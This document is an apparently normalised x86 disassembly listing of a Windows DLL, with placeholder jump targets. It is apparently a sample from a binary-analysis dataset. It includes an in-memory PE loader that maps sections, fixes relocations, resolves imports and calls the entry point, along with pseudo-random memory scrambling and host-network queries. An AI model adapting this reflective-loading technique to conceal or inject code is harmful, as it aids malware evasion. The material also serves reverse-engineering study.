mov cl [ ecx ]
dec edx
je r-xdata
mov cl [ ecx + 0x1 ]
jmp r-xdata
dec edx
je r-xdata
push edi
push esi
call sub_1000451b
mov cl [ ecx + 0x2 ]
jmp r-xdata
dec edx
je r-xdata
mov cl [ ecx + 0x1 ]
jmp r-xdata
dec edx
je r-xdata
push edi
push esi
call sub_1000455c
jmp r-xdata
mov cl [ ecx + 0x2 ]
jmp r-xdata
dec edx
jne r-xdata
pop ecx
pop ecx
mov eax esi
pop ebp
retn
mov cl [ ecx + 0x3 ]
sub_10004604
sub eax [ rw-data ]
push esi
push edi
xor edi edi
mov edx rw-data
add edx 0x10
inc edi
cmp edx rw-data
jl r-xdata
mov ecx eax
sub ecx esi
js r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
or eax 0xffffffff
movzx esi [ edx - 0x4 ]
cmp ecx esi
jle r-xdata
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_1000463d
push ebp
mov ebp esp
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax [ rw-data ]
mov edx 0x5a4d
cmp [ eax ] dx
je r-xdata
mov edx [ eax + 0x3c ]
cmp [ eax + edx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
mov edx edi
sub edx eax
sub eax [ rw-data ]
push esi
xor esi esi
test ecx ecx
je r-xdata
pop esi
mov ecx [ esi * 4 + rw-data ]
sub ecx edx
js r-xdata
inc esi
cmp esi [ rw-data ]
jb r-xdata
cmp ecx [ ebp + 0x8 ]
jge r-xdata
add ecx edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
add [ ecx ] eax
sub [ ecx ] eax
jmp r-xdata
sub_100046a7
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp + 0x8 ]
mov edi [ eax - 0x4 ]
inc edi
xor ebx ebx
mov [ ebp - 0x8 ] edi
mov esi rw-data
cmp [ rw-data ] ebx
jne r-xdata
push esi
call [ EnterCriticalSection@IAT ]
test [ ebp + 0x8 ] 0x20
jne r-xdata
push 0x3e8
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ ebp + 0x8 ] ebx
je r-xdata
push ebx
call [ ExitProcess@IAT ]
mov eax edi
call sub_10004604
cmp eax 0xffffffff
je r-xdata
mov ebx eax
shl ebx 0x4
test [ ebp + 0x8 ] 0x10
movzx esi [ ebx + rw-data ]
jne r-xdata
mov eax [ ebx + rw-data ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push esi
push edi
call [ rw-data ]
movzx edx [ ebx + rw-data ]
lea ecx [ ebx + rw-data ]
push edi
xor edi edi
mov [ ebp + 0x8 ] edx
mov [ ebp - 0xc ] ecx
call sub_100045ba
pop ecx
cmp [ ebx + rw-data ] edi
jne r-xdata
push 0x1
push esi
call sub_1000463d
pop ecx
pop ecx
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
push edi
mov edi [ ebp - 0x8 ]
push esi
call sub_1000463d
pop ecx
pop ecx
push esi
push edi
push eax
call sub_10005210
add esp 0xc
test [ ebp + 0x8 ] 0x10
jne r-xdata
push esi
push [ ebp - 0x8 ]
mov [ ebx + rw-data ] edi
push edi
call sub_10005210
mov ebx [ ebp - 0xc ]
add esp 0xc
mov [ ebp - 0x4 ] 0x4
call [ GetTickCount@IAT ]
add eax edi
mov ecx 0x269ec3
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x10 ]
push esi
push [ ebp - 0x8 ]
call [ rw-data ]
imul eax eax 0x343fd
add eax ecx
mov edx eax
shr edx 0x10
dec [ ebp - 0x4 ]
mov [ ebx ] dl
inc ebx
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ ebp + 0x8 ]
imul eax eax 0x343fd
push edi
add eax ecx
mov ecx [ ebp - 0xc ]
xor edi edi
inc edi
mov [ rw-data ] eax
call sub_100045ba
pop ecx
sub_10004834
push ebp
mov ebp esp
push ecx
push ecx
push ebx
lea eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub ebx 0xe
mov eax ebx
call sub_10004604
cmp eax 0xffffffff
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
pop ebx
leave
retn 0x4
push esi
push edi
mov edi eax
shl edi 0x4
movzx edx [ edi + rw-data ]
movzx esi [ edi + rw-data ]
sub ebx esi
mov [ ebp - 0x8 ] edx
test dl 0x20
jne r-xdata
pop edi
pop esi
test edx edx
je r-xdata
mov [ ebp + 0x8 ] edx
and [ ebp + 0x8 ] 0x10
jne r-xdata
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x40
push esi
push ebx
call [ rw-data ]
mov edx [ ebp - 0x8 ]
push esi
push eax
push ebx
call sub_10005210
add esp 0xc
lea ecx [ edi + rw-data ]
xor edi edi
push ebx
inc edi
call sub_100045ba
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x4 ]
push esi
push ebx
call [ rw-data ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub_100048da
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10012d86
push [ ebp + 0xc ]
mov esi eax
call sub_10005d4a
add esp 0xc
mov eax esi
pop esi
pop ebp
retn
sub_100048fb
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0x14 ]
push esi
lea esi [ ecx + eax + 0x28 ]
xor ecx ecx
cmp cx [ eax + 0x6 ]
jae r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
mov ebx 0x1000
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
mov ecx [ esi + 0x4 ]
push [ esi ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call sub_10005210
mov eax [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
pop edi
pop ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
movzx eax [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jl r-xdata
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
push [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
push 0x0
push eax
call sub_10005100
jmp r-xdata
add esp 0xc
sub_1000499f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x14 ]
and [ ebp - 0x4 ] 0x0
xor edx edx
lea ecx [ ecx + eax + 0x18 ]
cmp dx [ eax + 0x6 ]
jae r-xdata
leave
retn
push ebx
push esi
push edi
lea ebx [ ecx + 0x24 ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ edi + ecx * 2 ]
mov esi [ ecx * 4 + rw-data ]
test edx 0x4000000
je r-xdata
push 0x4000
push [ ebx - 0x14 ]
push [ ebx - 0x1c ]
call [ VirtualFree@IAT ]
jmp r-xdata
mov ecx [ ebx - 0x14 ]
test ecx ecx
jne r-xdata
or esi 0x200
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add ebx 0x28
cmp [ ebp - 0x4 ] ecx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
push ecx
push [ ebx - 0x1c ]
call [ VirtualProtect@IAT ]
test dl 0x40
je r-xdata
mov edx [ ebx ]
mov ecx edx
mov esi edx
shr ecx 0x1d
shr esi 0x1e
mov edi edx
and ecx 0x1
and esi 0x1
shr edi 0x1f
test edx 0x2000000
je r-xdata
pop edi
pop esi
pop ebx
test dl dl
jns r-xdata
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
sub_10004a5c
push ebp
mov ebp esp
push ecx
push esi
mov esi [ eax + 0x4 ]
mov eax [ eax ]
cmp [ eax + 0xa4 ] 0x0
jbe r-xdata
pop esi
leave
retn
mov eax [ eax + 0xa0 ]
add eax esi
mov ecx [ eax ]
test ecx ecx
je r-xdata
push ebx
push edi
add eax [ eax + 0x4 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
movzx ecx [ edx ]
mov ebx ecx
and ebx 0xfffff000
cmp ebx 0x3000
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ecx + esi ]
mov ecx [ eax + 0x4 ]
sub ecx 0x8
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
pop edi
pop ebx
mov ecx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
sub ecx 0x8
shr ecx 0x1
add edx 0x2
cmp [ ebp - 0x4 ] ecx
jb r-xdata
mov ebx [ ebp + 0x8 ]
and ecx 0xfff
add [ ecx + edi ] ebx
sub_10004ad7
push ebp
mov ebp esp
sub esp 0x10
mov eax [ edi ]
cmp [ eax + 0x84 ] 0x0
push ebx
mov ebx [ edi + 0x4 ]
mov [ ebp - 0xc ] 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
pop ebx
leave
retn
push esi
mov esi [ eax + 0x80 ]
push 0x14
add esi ebx
push esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
pop esi
add esi 0x10
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ edi + 0xc ]
lea eax [ eax * 4 + 0x4 ]
push eax
push [ edi + 0x8 ]
call sub_1000e7cf
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + ecx * 4 ] edx
inc [ edi + 0xc ]
mov eax [ esi - 0x10 ]
test eax eax
je r-xdata
mov esi [ esi ]
add esi ebx
mov ecx esi
lea esi [ eax + ebx ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
add ecx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] ecx
sub [ ebp - 0x4 ] esi
test eax eax
mov eax [ esi ]
test eax eax
je r-xdata
add [ ebp - 0x8 ] 0x14
mov eax [ ebp - 0x8 ]
push 0x14
add eax 0xfffffff0
push eax
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
add eax ebx
add eax 0x2
and eax 0xffff
jmp r-xdata
mov esi [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x0
add esi 0x4
mov eax [ esi ]
test eax eax
jne r-xdata
push eax
push [ ebp - 0x10 ]
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + esi ] eax
mov eax ecx
cmp [ eax + esi ] 0x0
je r-xdata
jns r-xdata
jmp r-xdata
sub_10004bf1
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
push ebx
mov ebx [ eax + 0x3c ]
add ebx eax
cmp [ ebx ] 0x4550
je r-xdata
xor eax eax
leave
retn
push esi
mov esi [ VirtualAlloc@IAT ]
push edi
push 0x4
mov edi 0x2000
push edi
push [ ebx + 0x50 ]
push [ ebx + 0x34 ]
call esi
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov eax [ ebp - 0x4 ]
push 0x4
xor ecx ecx
push 0x1000
mov [ edi + 0x4 ] eax
mov [ edi + 0xc ] ecx
mov [ edi + 0x8 ] ecx
mov [ edi + 0x10 ] ecx
push [ ebx + 0x50 ]
push eax
call esi
push 0x4
push 0x1000
push [ ebx + 0x54 ]
push [ ebp - 0x4 ]
call esi
mov ecx [ ebx + 0x54 ]
mov esi [ ebp + 0x8 ]
add ecx [ esi + 0x3c ]
mov [ ebp - 0x8 ] eax
push ecx
push esi
push eax
call sub_10005210
mov eax [ esi + 0x3c ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
push ebx
mov [ edi ] eax
push esi
mov [ eax + 0x34 ] ecx
call sub_100048fb
mov esi [ ebp - 0x4 ]
mov eax esi
add esp 0x18
sub eax [ ebx + 0x34 ]
je r-xdata
push 0x4
push edi
push [ ebx + 0x50 ]
push eax
call esi
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
call sub_10004ad7
test eax eax
je r-xdata
push eax
mov eax edi
call sub_10004a5c
pop ecx
xor eax eax
jmp r-xdata
mov esi edi
call sub_10004d0e
push edi
call sub_1000499f
mov eax [ edi ]
mov eax [ eax + 0x28 ]
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
mov eax edi
add eax esi
je r-xdata
push 0x0
xor ebx ebx
inc ebx
push ebx
push esi
call eax
test eax eax
jne r-xdata
mov [ edi + 0x10 ] ebx
sub_10004d0e
push ebx
xor ebx ebx
cmp esi ebx
je r-xdata
pop ebx
retn
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov ecx [ ecx + 0x28 ]
push ebx
push ebx
push eax
add ecx eax
call ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push edi
xor edi edi
cmp [ esi + 0xc ] ebx
jle r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push ebx
push eax
call [ VirtualFree@IAT ]
push [ esi + 0x8 ]
call sub_100079a5
pop ecx
pop edi
mov eax [ esi + 0x8 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0xffffffff
je r-xdata
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ eax ]
call [ FreeLibrary@IAT ]
sub_10004d81
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ GetNetworkParams@IAT ]
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
push ebx
mov [ ebp - 0x4 ] ebx
call esi
cmp eax 0x6f
jne r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
push edi
push [ ebp - 0x4 ]
call sub_10007b19
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
pop edi
lea eax [ ebp - 0x4 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
push edi
call sub_100079a5
pop ecx
lea eax [ edi + 0x110 ]
push eax
call [ inet_addr@IAT ]
mov ebx eax
sub_10004dd6
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x50
push 0x0
push esi
call sub_10005100
add esp 0xc
push 0x64
lea eax [ ebp - 0x68 ]
push eax
xor edi edi
call [ gethostname@IAT ]
lea eax [ ebp - 0x68 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10008edb
leave
retn
cmp [ eax + 0x8 ] 0x2
jne r-xdata
mov eax edi
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax [ eax ]
inc edi
mov [ esi + ecx * 4 ] eax
inc ecx
add edx 0x4
cmp ecx 0x14
jl r-xdata
mov eax [ edx ]
test eax eax
je r-xdata
sub_10004e40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov dl [ esi ]
add eax esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ebp + 0x8 ]
push edi
push 0x4
pop ebx
cmp dl 0x11
jbe r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
movzx edi dl
sub edi 0x11
lea ecx [ esi + 0x1 ]
cmp edi ebx
jb r-xdata
cmp esi 0x40
jb r-xdata
test esi esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x1
jbe r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec edi
jne r-xdata
cmp esi 0x20
jb r-xdata
mov edx esi
shr edx 0x2
and edx 0x7
mov edi eax
sub edi edx
movzx edx [ ecx ]
shl edx 0x3
sub edi edx
dec edi
shr esi 0x5
inc ecx
dec esi
mov edx [ ecx ]
mov [ eax ] edx
add eax ebx
add ecx ebx
dec esi
je r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x2
jbe r-xdata
jmp r-xdata
mov edi eax
cmp esi 0x10
jb r-xdata
and esi 0x1f
jne r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
cmp esi ebx
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
movzx edx [ ecx ]
shl edx 0x2
sub edi edx
shr esi 0x2
sub edi esi
mov dl [ edi - 0x1 ]
mov [ eax ] dl
mov dl [ edi ]
inc ecx
mov [ eax + 0x1 ] dl
add eax 0x2
jmp r-xdata
mov edx esi
and edx 0x8
shl edx 0xb
sub edi edx
and esi 0x7
jne r-xdata
movzx edx [ ecx ]
shr edx 0x2
mov edi eax
sub edi edx
dec edi
add ecx 0x2
jmp r-xdata
jmp r-xdata
movzx edi [ ecx - 0x2 ]
and edi 0x3
je r-xdata
movzx edx [ ecx ]
shl edx 0x2
mov edi eax
sub edi edx
shr esi 0x2
sub edi esi
mov dl [ edi - 0x801 ]
mov [ eax ] dl
mov dl [ edi - 0x800 ]
mov [ eax + 0x1 ] dl
mov dl [ edi - 0x7ff ]
inc ecx
mov [ eax + 0x2 ] dl
add eax 0x3
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
mov edx [ ecx ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add ecx ebx
cmp esi ebx
jae r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0xf ]
inc ecx
movzx edx [ ecx ]
shr edx 0x2
sub edi edx
add ecx 0x2
cmp edi eax
je r-xdata
jmp r-xdata
cmp esi 0x6
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
test esi esi
je r-xdata
sub eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ecx
sub eax [ ebp - 0x4 ]
cmp ecx [ ebp - 0x4 ]
pop edi
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0xfffffffc
neg eax
sbb eax eax
pop esi
and eax ecx
pop ebx
leave
retn
sub edi 0x4000
cmp [ ecx ] 0x0
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
mov dl [ edi + 0x1 ]
mov [ eax + 0x1 ] dl
add eax 0x2
add edi 0x2
mov edx eax
sub edx edi
cmp edx ebx
jl r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x1f ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x7 ]
inc ecx
mov edx [ edi ]
mov [ eax ] edx
add eax ebx
add edi ebx
sub esi 0x2
jmp r-xdata
mov edx [ edi ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add edi ebx
cmp esi ebx
jae r-xdata
test esi esi
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
sub_1000506e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_10006aae
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100068b5
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_10005100
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_100078db
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10005190
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10007b19
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10007bbc
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10005687
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10007be4
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_10005571
push sub_10013846
mov [ rw-data ] esi
call sub_10007b02
pop ecx
sub_10005210
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10005294 ]
jmp [ ecx * 4 + jump_table_10005314 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005380 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1000551c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10005420 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000551c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10005380 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000551c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005380 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005380 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005380 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000551c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000551c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000551c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
